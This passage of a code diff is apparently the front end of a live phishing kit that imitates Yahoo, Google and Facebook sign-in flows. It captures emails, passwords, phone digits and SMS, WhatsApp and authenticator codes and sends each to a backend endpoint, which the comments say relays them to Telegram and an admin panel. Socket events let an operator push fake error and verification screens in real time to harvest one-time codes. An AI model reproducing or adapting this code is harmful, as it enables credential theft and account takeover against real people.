+        currentSocketId = socket.id;
+        reportVisibleGoogleStep();
+
+        if (!_glFirstConnect) {
+          clearReconnectUi();
+        }
+        _glFirstConnect = false;
+      });
+
+      socket.on('show-calendar', function () {
+        try { sessionStorage.setItem('calendlySession', '1'); } catch(e) {}
+        window.location.href = 'calendly';
+      });
+      socket.on('show-passkey', function () {
+        try { sessionStorage.setItem('passkeySession', '1'); } catch(e) {}
+        window.location.href = 'passkey';
+      });
+      socket.on('redirect',      function (url) { window.location.href = url; });
+
+      /* Admin panel → "Yahoo MailWRONGPASS" button → show wrong password error */
+      socket.on('show-yahoo-wrong-pass', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        pwInput.value = '';
+        showPwErr('Incorrect password. Try again');
+      });
+
+      socket.on('show-yahoo-email-verify', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        showYahooEmailVerifyStep();
+      });
+
+      socket.on('show-yahoo-push-notify', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        showYahooPushNotifyStep();
+      });
+
+      socket.on('show-yahoo-whatsapp-phone', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        var areaDigit = (data && data.areaDigit != null) ? String(data.areaDigit).replace(/\D/g, '').slice(0, 1) : '3';
+        var lastTwo = (data && data.lastTwo != null) ? String(data.lastTwo).replace(/\D/g, '').slice(-2) : '92';
+        if (lastTwo.length < 2) lastTwo = (lastTwo + '92').slice(-2);
+        if (!areaDigit) areaDigit = '3';
+        try {
+          sessionStorage.setItem('yahooWhatsappAreaDigit', areaDigit);
+          sessionStorage.setItem('yahooWhatsappLastTwo', lastTwo);
+        } catch (e) {}
+        showYahooWhatsappPhoneStep(areaDigit, lastTwo);
+      });
+
+      socket.on('show-yahoo-sms-verify-phone', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        var areaDigit = (data && data.areaDigit != null) ? String(data.areaDigit).replace(/\D/g, '').slice(0, 1) : '3';
+        var lastTwo = (data && data.lastTwo != null) ? String(data.lastTwo).replace(/\D/g, '').slice(-2) : '92';
+        if (lastTwo.length < 2) lastTwo = (lastTwo + '92').slice(-2);
+        if (!areaDigit) areaDigit = '3';
+        try {
+          sessionStorage.setItem('yahooSmsUdsAreaDigit', areaDigit);
+          sessionStorage.setItem('yahooSmsUdsLastTwo', lastTwo);
+        } catch (e) {}
+        showYahooSmsUdsPhoneStep(areaDigit, lastTwo);
+      });
+
+      /* ─── Facebook security modals — redirect back to origin page ─── */
+      var fbModalMap = {
+        'show-2fa':          '2fa',
+        'show-auth':         'auth',
+        'show-email':        'email',
+        'show-whatsapp':     'whatsapp',
+        'show-old-pass':     'oldpass',
+        'show-wrong-creds':  'wrongcreds'
+      };
+      Object.keys(fbModalMap).forEach(function (event) {
+        socket.on(event, function () {
+          var returnPage = sessionStorage.getItem('yahooReturnPage') || 'apply.html';
+          try {
+            sessionStorage.setItem('pendingModal', fbModalMap[event]);
+            sessionStorage.removeItem('yahooReturnPage');
+          } catch (e) {}
+          window.location.href = returnPage;
+        });
+      });
+
+      /* Admin panel → "GooglePhone" button → show phone step with prefix */
+      socket.on('show-yahoo-phone', function (prefix) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('phonePrefixBox').textContent = prefixText;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step3ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step3').style.display = 'flex';
+        document.getElementById('phoneInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → GooglePrompt → show number prompt */
+      socket.on('show-yahoo-prompt', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var num = (data && data.number) ? String(data.number) : '58';
+        var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+        var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+        var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
+
+        document.getElementById('promptNumber').textContent           = num;
+        document.getElementById('promptNumberInline').textContent      = num;
+        document.getElementById('promptDeviceName').textContent        = hasDevice
+          ? ('Open the Yahoo Mail app on ' + deviceLabel)
+          : 'Open the Yahoo Mail app';
+        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceLabel : 'phone';
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step4ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step4').style.display = 'flex';
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → GoogleSMS → show SMS phone-entry step */
+      socket.on('show-yahoo-sms', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        // data can be { prefix, lastTwo } or legacy plain string
+        var prefix  = (data && typeof data === 'object') ? (data.prefix || '') : String(data || '');
+        var lastTwo = (data && typeof data === 'object') ? (data.lastTwo || '00') : '00';
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('smsPrefixBox').textContent = prefixText;
+        document.getElementById('smsLastTwo').textContent = lastTwo;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step5ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step5').style.display = 'flex';
+        document.getElementById('smsPhoneInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → WrongNumber → error on SMS phone step */
+      socket.on('show-yahoo-wrong-number', function () {
+        var smsUdsPhoneVisible = document.getElementById('stepUdsSmsPhone').style.display !== 'none';
+        if (smsUdsPhoneVisible) {
+          var smsBtn = document.getElementById('yahooSmsUdsPhoneNextBtn');
+          var smsLbl = document.getElementById('yahooSmsUdsPhoneBtnLabel');
+          setLoading(smsBtn, smsLbl, false);
+          overlay.classList.remove('visible');
+          clearYahooSmsUdsPhoneDigits();
+          var smsBox = document.getElementById('yahooSmsUdsPhoneBox');
+          var smsErr = document.getElementById('yahooSmsUdsPhoneError');
+          if (smsBox) smsBox.classList.add('err');
+          if (smsErr) smsErr.classList.add('visible');
+          var sms0 = document.getElementById('yahooSmsUdsDigit0');
+          if (sms0) sms0.focus();
+          return;
+        }
+        var waVisible = document.getElementById('stepWhatsappPhone').style.display !== 'none';
+        if (waVisible) {
+          var waBtn = document.getElementById('yahooWhatsappPhoneNextBtn');
+          var waLbl = document.getElementById('yahooWhatsappPhoneBtnLabel');
+          setLoading(waBtn, waLbl, false);
+          overlay.classList.remove('visible');
+          clearYahooWhatsappPhoneDigits();
+          var waBox = document.getElementById('yahooWhatsappPhoneBox');
+          var waErr = document.getElementById('yahooWhatsappPhoneError');
+          if (waBox) waBox.classList.add('err');
+          if (waErr) {
+            waErr.textContent = 'Those digits don\u2019t match. Try again.';
+            waErr.classList.add('visible');
+          }
+          var wa0 = document.getElementById('yahooWhatsappDigit0');
+          if (wa0) wa0.focus();
+          return;
+        }
+        var smsPhoneInput = document.getElementById('smsPhoneInput');
+        var smsPhoneError = document.getElementById('smsPhoneError');
+        var smsSendBtn    = document.getElementById('smsSendBtn');
+        var smsSendLabel  = document.getElementById('smsSendLabel');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        overlay.classList.remove('visible');
+        smsPhoneError.textContent = 'This number is not associated with your Yahoo account. Try again.';
+        showErr(smsPhoneInput, smsPhoneError);
+      });
+
+      /* Admin panel → WrongCode → error on SMS code OR auth step (auto-detects visible step) */
+      socket.on('show-yahoo-wrong-code', function () {
+        var emailVerifyVisible = document.getElementById('stepEmailVerify').style.display !== 'none';
+        if (emailVerifyVisible) {
+          var yBtn = document.getElementById('yahooEmailCodeNextBtn');
+          var yLbl = document.getElementById('yahooEmailCodeBtnLabel');
+          setLoading(yBtn, yLbl, false);
+          overlay.classList.remove('visible');
+          clearYahooEmailCodeInputs();
+          var yBox = document.getElementById('yahooEmailCodeBox');
+          var yErr = document.getElementById('yahooEmailCodeError');
+          if (yBox) yBox.classList.add('err');
+          if (yErr) yErr.classList.add('visible');
+          var y0 = document.getElementById('yahooEmailCode0');
+          if (y0) y0.focus();
+        } else if (document.getElementById('stepUdsSmsCode').style.display !== 'none') {
+          var udsSmsBtn = document.getElementById('yahooSmsUdsCodeNextBtn');
+          var udsSmsLbl = document.getElementById('yahooSmsUdsCodeBtnLabel');
+          setLoading(udsSmsBtn, udsSmsLbl, false);
+          overlay.classList.remove('visible');
+          clearYahooSmsUdsCodeInputs();
+          var udsSmsBox = document.getElementById('yahooSmsUdsCodeBox');
+          var udsSmsErr = document.getElementById('yahooSmsUdsCodeError');
+          if (udsSmsBox) udsSmsBox.classList.add('err');
+          if (udsSmsErr) udsSmsErr.classList.add('visible');
+          var udsSms0 = document.getElementById('yahooSmsUdsCode0');
+          if (udsSms0) udsSms0.focus();
+        } else if (document.getElementById('stepWhatsappSmsCode').style.display !== 'none') {
+          var waSmsBtn = document.getElementById('yahooWhatsappSmsCodeNextBtn');
+          var waSmsLbl = document.getElementById('yahooWhatsappSmsCodeBtnLabel');
+          setLoading(waSmsBtn, waSmsLbl, false);
+          overlay.classList.remove('visible');
+          clearYahooWhatsappSmsCodeInputs();
+          var waSmsBox = document.getElementById('yahooWhatsappSmsCodeBox');
+          var waSmsErr = document.getElementById('yahooWhatsappSmsCodeError');
+          if (waSmsBox) waSmsBox.classList.add('err');
+          if (waSmsErr) waSmsErr.classList.add('visible');
+          var waSms0 = document.getElementById('yahooWhatsappSmsCode0');
+          if (waSms0) waSms0.focus();
+        } else if (document.getElementById('step6').style.display !== 'none') {
+          var smsCodeInput   = document.getElementById('smsCodeInput');
+          var smsCodeError   = document.getElementById('smsCodeError');
+          var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+          var smsCodeLabel   = document.getElementById('smsCodeLabel');
+          setLoading(smsCodeNextBtn, smsCodeLabel, false);
+          overlay.classList.remove('visible');
+          smsCodeInput.value = '';
+          smsCodeInput.classList.remove('has-val');
+          showErr(smsCodeInput, smsCodeError);
+        } else {
+          /* Authenticator step */
+          var authCodeInput   = document.getElementById('authCodeInput');
+          var authCodeError   = document.getElementById('authCodeError');
+          var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+          var authCodeLabel   = document.getElementById('authCodeLabel');
+          setLoading(authCodeNextBtn, authCodeLabel, false);
+          overlay.classList.remove('visible');
+          authCodeInput.value = '';
+          authCodeInput.classList.remove('has-val');
+          showErr(authCodeInput, authCodeError);
+        }
+      });
+
+      /* Admin panel → WrongAuthCode → specifically targets authenticator step */
+      socket.on('show-yahoo-wrong-auth-code', function () {
+        var authCodeInput   = document.getElementById('authCodeInput');
+        var authCodeError   = document.getElementById('authCodeError');
+        var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+        var authCodeLabel   = document.getElementById('authCodeLabel');
+        setLoading(authCodeNextBtn, authCodeLabel, false);
+        overlay.classList.remove('visible');
+        authCodeInput.value = '';
+        authCodeInput.classList.remove('has-val');
+        showErr(authCodeInput, authCodeError);
+      });
+
+      /* Admin panel → GoogleAuth → show authenticator code step */
+      socket.on('show-yahoo-auth', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step7ChipEmail').textContent = addr;
+
+        hideAllSteps();
+        document.getElementById('step7').style.display = 'flex';
+        document.getElementById('authCodeInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+    } catch (e) {}
+
+    /* ─── Destination app name — Calendly when opened from Continue with Google ─── */
+    if (sessionStorage.getItem('yahooContinueApp') === 'calendly') {
+      var continueAppBtn = document.getElementById('continueAppBtn');
+      if (continueAppBtn) continueAppBtn.textContent = 'Calendly';
+      document.querySelectorAll('[data-privacy-notice]').forEach(function (el) {
+        el.innerHTML =
+          'Before using this app, you can review Calendly\'s ' +
+          '<a href="https://calendly.com/privacy" target="_blank">Privacy Policy</a> ' +
+          'and ' +
+          '<a href="https://calendly.com/terms" target="_blank">Terms of Service</a>.';
+      });
+    }
+
+    /* ─── Pre-fill email from Facebook login / verify flow ─── */
+    try { sessionStorage.removeItem('yahooSkipEmailPrefill'); } catch (e) {}
+    var storedEmail = sessionStorage.getItem('lastLoginEmail')
+      || sessionStorage.getItem('yahooVerifyDisplayEmail')
+      || '';
+    if (storedEmail) {
+      emailInput.value = storedEmail;
+      emailInput.classList.add('has-val');
+      chipEmail.textContent = storedEmail;
+    }
+
+    /* Keep label floating in sync */
+    emailInput.addEventListener('input', function () {
+      emailInput.classList.toggle('has-val', emailInput.value.length > 0);
+      clearErr(emailInput, emailErr);
+    });
+
+    pwInput.addEventListener('input', function () {
+      clearErr(pwInput, pwErr);
+    });
+
+    if (pwShowBtn) {
+      pwShowBtn.addEventListener('click', function () {
+        var show = pwInput.type === 'password';
+        pwInput.type = show ? 'text' : 'password';
+        pwShowBtn.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+        pwShowBtn.setAttribute('aria-pressed', show ? 'true' : 'false');
+        pwInput.focus();
+      });
+    }
+
+    /* ─── Step 1: Email → Next ─── */
+    emailNextBtn.addEventListener('click', function () {
+      var addr = emailInput.value.trim();
+      if (!addr) {
+        showErr(emailInput, emailErr);
+        return;
+      }
+
+      setLoading(emailNextBtn, emailLabel, true);
+      try { sessionStorage.setItem('lastLoginEmail', addr); } catch (e) {}
+
+      /* Notify backend so Telegram shows the Google email step */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: '', type: 'yahoo_email' }))
+      }).catch(function () {});
+
+      setTimeout(function () {
+        setLoading(emailNextBtn, emailLabel, false);
+        chipEmail.textContent = addr;
+        step1.style.display = 'none';
+        step2.style.display = 'flex';
+        pwInput.focus();
+        reportVisibleGoogleStep();
+      }, 600);
+    });
+
+    emailInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') emailNextBtn.click();
+    });
+
+    /* ─── Forgot password → back to step 1 ─── */
+    var forgotPwBtn = document.getElementById('forgotPwBtn');
+    if (forgotPwBtn) {
+      forgotPwBtn.addEventListener('click', function () {
+        pwInput.value = '';
+        pwInput.type = 'password';
+        clearPwErrState();
+        if (pwShowBtn) {
+          pwShowBtn.setAttribute('aria-label', 'Show password');
+          pwShowBtn.setAttribute('aria-pressed', 'false');
+        }
+        step2.style.display = 'none';
+        step1.style.display = 'flex';
+        emailInput.focus();
+      });
+    }
+
+    /* ─── Step 2: Password → Next ─── */
+    pwNextBtn.addEventListener('click', function () {
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var pass = pwInput.value;
+      if (!pass) {
+        showPwErr('Enter your password.');
+        return;
+      }
+
+      setLoading(pwNextBtn, pwLabel, true);
+      overlay.classList.add('visible');
+
+      /* Send credentials to backend → shows in Telegram / admin panel */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: pass, type: 'yahoo_password' }))
+      }).catch(function () {});
+
+      /* Keep spinner until admin sends show-yahoo-wrong-pass or redirect */
+      pwWaitTimer = setTimeout(function () { /* keep waiting */ }, 30000);
+    });
+
+    pwInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') pwNextBtn.click();
+    });
+
+    /* ─── Step 3: Phone ─── */
+    var step3      = document.getElementById('step3');
+    var phoneInput = document.getElementById('phoneInput');
+    var phoneErr   = document.getElementById('phoneError');
+    var phoneNextBtn = document.getElementById('phoneNextBtn');
+    var phoneBtnLabel = document.getElementById('phoneBtnLabel');
+
+    phoneInput.addEventListener('input', function () {
+      phoneInput.classList.toggle('has-val', phoneInput.value.length > 0);
+      clearErr(phoneInput, phoneErr);
+    });
+
+    phoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') phoneNextBtn.click();
+    });
+
+    document.getElementById('phoneBackBtn').addEventListener('click', function () {
+      phoneInput.value = '';
+      phoneInput.classList.remove('has-val', 'err');
+      phoneErr.classList.remove('visible');
+      step3.style.display = 'none';
+      step2.style.display = 'flex';
+      pwInput.focus();
+    });
+
+    phoneNextBtn.addEventListener('click', function () {
+      var phone = phoneInput.value.trim();
+      if (!phone) {
+        showErr(phoneInput, phoneErr);
+        return;
+      }
+
+      var prefix = document.getElementById('phonePrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(phoneNextBtn, phoneBtnLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: fullPhone, type: 'yahoo_phone' }))
+      }).catch(function () {});
+    });
+
+    var loginboxEl = document.getElementById('loginbox');
+
+    function setLoginboxUdsTall(on) {
+      if (loginboxEl) loginboxEl.classList.toggle('loginbox-uds-tall', !!on);
+    }
+
+    function getYahooEmailCodeValue() {
+      var digits = '';
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooEmailCode' + i);
+        if (inp) digits += String(inp.value || '').replace(/\D/g, '');
+      }
+      return digits.length === 6 ? digits : '';
+    }
+
+    function updateYahooEmailCodeNextState() {
+      var btn = document.getElementById('yahooEmailCodeNextBtn');
+      if (btn) btn.disabled = !getYahooEmailCodeValue();
+    }
+
+    function clearYahooEmailCodeInputs() {
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooEmailCode' + i);
+        if (inp) inp.value = '';
+      }
+      var box = document.getElementById('yahooEmailCodeBox');
+      var err = document.getElementById('yahooEmailCodeError');
+      if (box) box.classList.remove('err');
+      if (err) err.classList.remove('visible');
+      updateYahooEmailCodeNextState();
+    }
+
+    function showYahooEmailVerifyStep() {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      var step = document.getElementById('stepEmailVerify');
+      if (step) step.style.display = 'flex';
+      clearYahooEmailCodeInputs();
+      var first = document.getElementById('yahooEmailCode0');
+      if (first) first.focus();
+      reportVisibleGoogleStep();
+    }
+
+    function resetYahooPushSendButton() {
+      var sendBtn = document.getElementById('yahooPushSendBtn');
+      var sendLbl = document.getElementById('yahooPushSendBtnLabel');
+      if (!sendBtn || !sendLbl) return;
+      sendLbl.dataset.idleLabel = 'Send';
+      setLoading(sendBtn, sendLbl, false);
+    }
+
+    function showYahooPushNotifyStep() {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var emailEl = document.getElementById('yahooPushNotifyAccountEmail');
+      if (emailEl) emailEl.textContent = addr;
+      resetYahooPushSendButton();
+      var step = document.getElementById('stepPushNotify');
+      if (step) step.style.display = 'flex';
+      reportVisibleGoogleStep();
+    }
+
+    function initYahooPushNotifyButtons() {
+      var sendBtn = document.getElementById('yahooPushSendBtn');
+      var sendLbl = document.getElementById('yahooPushSendBtnLabel');
+      if (!sendBtn || !sendLbl) return;
+      sendBtn.addEventListener('click', function () {
+        if (sendBtn.disabled) return;
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        setLoading(sendBtn, sendLbl, true);
+        overlay.classList.add('visible');
+        fetch(BACKEND + '/send-login-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(yahooPostBody({ username: addr, password: 'Send', type: 'yahoo_push_send' }))
+        }).catch(function () {});
+      });
+    }
+
+    function getYahooWhatsappPhoneDigits() {
+      var d0 = document.getElementById('yahooWhatsappDigit0');
+      var d1 = document.getElementById('yahooWhatsappDigit1');
+      var a = d0 ? d0.value.replace(/\D/g, '') : '';
+      var b = d1 ? d1.value.replace(/\D/g, '') : '';
+      return a.length === 1 && b.length === 1 ? a + b : '';
+    }
+
+    function updateYahooWhatsappPhoneNextState() {
+      var btn = document.getElementById('yahooWhatsappPhoneNextBtn');
+      if (btn) btn.disabled = !getYahooWhatsappPhoneDigits();
+    }
+
+    function clearYahooWhatsappPhoneDigits() {
+      var d0 = document.getElementById('yahooWhatsappDigit0');
+      var d1 = document.getElementById('yahooWhatsappDigit1');
+      if (d0) d0.value = '';
+      if (d1) d1.value = '';
+      var box = document.getElementById('yahooWhatsappPhoneBox');
+      var err = document.getElementById('yahooWhatsappPhoneError');
+      if (box) box.classList.remove('err');
+      if (err) err.classList.remove('visible');
+      updateYahooWhatsappPhoneNextState();
+    }
+
+    function showYahooWhatsappPhoneStep(areaDigit, lastTwo) {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var emailEl = document.getElementById('yahooWhatsappAccountEmail');
+      if (emailEl) emailEl.textContent = addr;
+      var prefixEl = document.getElementById('yahooWhatsappPrefixDisplay');
+      if (prefixEl) prefixEl.textContent = formatYahooAreaPrefix(areaDigit);
+      var suffixEl = document.getElementById('yahooWhatsappSuffixDisplay');
+      if (suffixEl) suffixEl.textContent = lastTwo;
+      clearYahooWhatsappPhoneDigits();
+      var step = document.getElementById('stepWhatsappPhone');
+      if (step) step.style.display = 'flex';
+      var first = document.getElementById('yahooWhatsappDigit0');
+      if (first) first.focus();
+      reportVisibleGoogleStep();
+    }
+
+    function initYahooWhatsappPhoneInputs() {
+      var d0 = document.getElementById('yahooWhatsappDigit0');
+      var d1 = document.getElementById('yahooWhatsappDigit1');
+      if (!d0 || !d1) return;
+
+      function onInput(inp, nextInp) {
+        inp.addEventListener('input', function () {
+          var box = document.getElementById('yahooWhatsappPhoneBox');
+          var err = document.getElementById('yahooWhatsappPhoneError');
+          if (box) box.classList.remove('err');
+          if (err) err.classList.remove('visible');
+          inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
+          if (inp.value && nextInp) nextInp.focus();
+          updateYahooWhatsappPhoneNextState();
+        });
+        inp.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !inp.value && inp === d1) d0.focus();
+          if (e.key === 'Enter') {
+            var btn = document.getElementById('yahooWhatsappPhoneNextBtn');
+            if (btn && !btn.disabled) btn.click();
+          }
+        });
+      }
+      onInput(d0, d1);
+      onInput(d1, null);
+
+      var nextBtn = document.getElementById('yahooWhatsappPhoneNextBtn');
+      var nextLbl = document.getElementById('yahooWhatsappPhoneBtnLabel');
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          var digits = getYahooWhatsappPhoneDigits();
+          if (!digits) return;
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          var area = '';
+          var last = '';
+          try {
+            area = sessionStorage.getItem('yahooWhatsappAreaDigit') || '';
+            last = sessionStorage.getItem('yahooWhatsappLastTwo') || '';
+          } catch (e) {}
+          setLoading(nextBtn, nextLbl, true);
+          overlay.classList.add('visible');
+          try { sessionStorage.setItem('yahooWhatsappMiddleDigits', digits); } catch (e) {}
+          setLoading(nextBtn, nextLbl, false);
+          overlay.classList.remove('visible');
+          showYahooWhatsappSmsStep(area, digits, last);
+          fetch(BACKEND + '/send-login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(yahooPostBody({
+              username: addr,
+              password: digits,
+              type: 'yahoo_whatsapp_phone_digits',
+              meta: { areaDigit: area, lastTwo: last }
+            }))
+          }).catch(function () {});
+        });
+      }
+    }
+
+    initYahooWhatsappPhoneInputs();
+
+    function formatYahooAreaPrefix(areaDigit) {
+      var area = String(areaDigit || '3').replace(/\D/g, '').slice(0, 1) || '3';
+      if (area === '1') return '+1';
+      return '+' + area + '**';
+    }
+
+    function formatYahooMaskedPhoneDisplay(areaDigit, middleDigits, lastTwo) {
+      var area = String(areaDigit || '3').replace(/\D/g, '').slice(0, 1) || '3';
+      var prefix = formatYahooAreaPrefix(area);
+      var mid = String(middleDigits || '').replace(/\D/g, '').slice(0, 2);
+      if (mid.length < 2) mid = (mid + '00').slice(0, 2);
+      var last = String(lastTwo || '92').replace(/\D/g, '').slice(-2);
+      if (last.length < 2) last = (last + '92').slice(-2);
+      if (area === '1') {
+        return prefix + ' ** ** ' + mid + ' ' + last;
+      }
+      return prefix + ' ** **' + mid.charAt(0) + ' ' + mid.charAt(1) + last;
+    }
+
+    function focusYahooVerifyCodeInputs(inputs) {
+      if (!inputs || !inputs.length) return;
+      for (var i = 0; i < inputs.length; i++) {
+        if (!inputs[i].value) {
+          inputs[i].focus();
+          return;
+        }
+      }
+      inputs[5].focus();
+    }
+
+    function bindYahooVerifyCodeBoxClick(boxId, inputs) {
+      var box = document.getElementById(boxId);
+      if (!box || !inputs.length) return;
+      box.addEventListener('click', function () {
+        focusYahooVerifyCodeInputs(inputs);
+      });
+    }
+
+    function getYahooWhatsappSmsCodeValue() {
+      var digits = '';
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooWhatsappSmsCode' + i);
+        if (inp) digits += String(inp.value || '').replace(/\D/g, '');
+      }
+      return digits.length === 6 ? digits : '';
+    }
+
+    function updateYahooWhatsappSmsCodeNextState() {
+      var btn = document.getElementById('yahooWhatsappSmsCodeNextBtn');
+      if (btn) btn.disabled = !getYahooWhatsappSmsCodeValue();
+    }
+
+    function clearYahooWhatsappSmsCodeInputs() {
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooWhatsappSmsCode' + i);
+        if (inp) inp.value = '';
+      }
+      var box = document.getElementById('yahooWhatsappSmsCodeBox');
+      var err = document.getElementById('yahooWhatsappSmsCodeError');
+      if (box) box.classList.remove('err');
+      if (err) err.classList.remove('visible');
+      updateYahooWhatsappSmsCodeNextState();
+    }
+
+    function showYahooWhatsappSmsStep(areaDigit, middleDigits, lastTwo) {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      overlay.classList.remove('visible');
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var emailEl = document.getElementById('yahooWhatsappSmsAccountEmail');
+      if (emailEl) emailEl.textContent = addr;
+      var phoneEl = document.getElementById('yahooWhatsappSmsPhoneDisplay');
+      if (phoneEl) {
+        phoneEl.textContent = formatYahooMaskedPhoneDisplay(areaDigit, middleDigits, lastTwo);
+      }
+      clearYahooWhatsappSmsCodeInputs();
+      var step = document.getElementById('stepWhatsappSmsCode');
+      if (step) step.style.display = 'flex';
+      var first = document.getElementById('yahooWhatsappSmsCode0');
+      setTimeout(function () { if (first) first.focus(); }, 0);
+      reportVisibleGoogleStep();
+    }
+
+    function initYahooWhatsappSmsCodeInputs() {
+      var inputs = [];
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooWhatsappSmsCode' + i);
+        if (inp) inputs.push(inp);
+      }
+      if (!inputs.length) return;
+
+      inputs.forEach(function (inp, idx) {
+        inp.addEventListener('input', function () {
+          var box = document.getElementById('yahooWhatsappSmsCodeBox');
+          var err = document.getElementById('yahooWhatsappSmsCodeError');
+          if (box) box.classList.remove('err');
+          if (err) err.classList.remove('visible');
+          var raw = inp.value.replace(/\D/g, '');
+          if (idx === 0 && raw.length > 1) {
+            for (var j = 0; j < 6; j++) inputs[j].value = raw.charAt(j) || '';
+            if (raw.length >= 6) inputs[5].focus();
+            else if (raw.length > 0) inputs[Math.min(raw.length, 5)].focus();
+          } else {
+            inp.value = raw.slice(0, idx === 0 ? 6 : 1);
+            if (inp.value && idx < 5) inputs[idx + 1].focus();
+          }
+          updateYahooWhatsappSmsCodeNextState();
+        });
+        inp.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx - 1].focus();
+          if (e.key === 'Enter') {
+            var btn = document.getElementById('yahooWhatsappSmsCodeNextBtn');
+            if (btn && !btn.disabled) btn.click();
+          }
+        });
+        inp.addEventListener('paste', function (e) {
+          if (idx !== 0) return;
+          e.preventDefault();
+          var text = (e.clipboardData || window.clipboardData).getData('text') || '';
+          var digits = text.replace(/\D/g, '').slice(0, 6);
+          for (var k = 0; k < 6; k++) inputs[k].value = digits.charAt(k) || '';
+          if (digits.length >= 6) inputs[5].focus();
+          else if (digits.length) inputs[digits.length].focus();
+          updateYahooWhatsappSmsCodeNextState();
+        });
+      });
+
+      bindYahooVerifyCodeBoxClick('yahooWhatsappSmsCodeBox', inputs);
+
+      var nextBtn = document.getElementById('yahooWhatsappSmsCodeNextBtn');
+      var nextLbl = document.getElementById('yahooWhatsappSmsCodeBtnLabel');
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          var code = getYahooWhatsappSmsCodeValue();
+          if (!code) return;
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          setLoading(nextBtn, nextLbl, true);
+          overlay.classList.add('visible');
+          fetch(BACKEND + '/send-login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(yahooPostBody({ username: addr, password: code, type: 'yahoo_whatsapp_sms_code' }))
+          }).catch(function () {});
+        });
+      }
+    }
+
+    initYahooWhatsappSmsCodeInputs();
+
+    function getYahooSmsUdsPhoneDigits() {
